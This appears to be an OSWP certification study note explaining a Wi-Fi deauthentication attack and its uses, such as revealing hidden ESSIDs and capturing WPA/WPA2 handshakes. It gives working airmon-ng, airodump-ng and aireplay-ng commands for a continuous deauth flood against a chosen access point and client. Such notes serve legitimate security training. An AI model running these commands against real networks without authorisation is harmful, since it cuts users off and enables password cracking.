# OSWP - Deauthentication Attack (WEP/WPA/WPA2)

This attack sends disassocate packets to one or more clients which are currently associated with a particular access point. Disassociating clients can be done for a number of reasons:

* Recovering a hidden ESSID. This is an ESSID which is not being broadcast. Another term for this is “cloaked”.
* Capturing WPA/WPA2 handshakes by forcing clients to reauthenticate
* Generate ARP requests (Windows clients sometimes flush their ARP cache when disconnected)

Of course, this attack is totally useless if there are no associated wireless client or on fake authentications.

## Commands

* Run [setup](../../setup.md) first
* Two terminals are needed, so `screen` is your friend
* At least one client must be associated with the AP
* No need to fakeauth, the first deauth will set AUTH to OPN

```bash
# [Terminal One]
# Set interface to monitor mode
sudo airmon-ng start $DEVICE $CHANNEL

# Start monitoring - make terminal large enough to see everything
sudo airodump-ng -c $CHANNEL --bssid $BSSID -w $TAG $INTERFACE

# [Terminal Two]
# Run the deauthentication attack
sudo aireplay-ng --deauth 0 -a $BSSID -c $CLIENT $INTERFACE
```
*Note: Run ping on the client, pinging the AP, to see ping freeze while running the deauth attack.*

## References

* [Airmon-ng](https://www.aircrack-ng.org/doku.php?id=airmon-ng)
* [Aireplay-ng](https://www.aircrack-ng.org/doku.php?id=aireplay-ng)
* [Deauthentication](https://www.aircrack-ng.org/doku.php?id=deauthentication)
* [REdBlueTeam](https://youtu.be/_9qJ1Urpn0Y?t=2285)
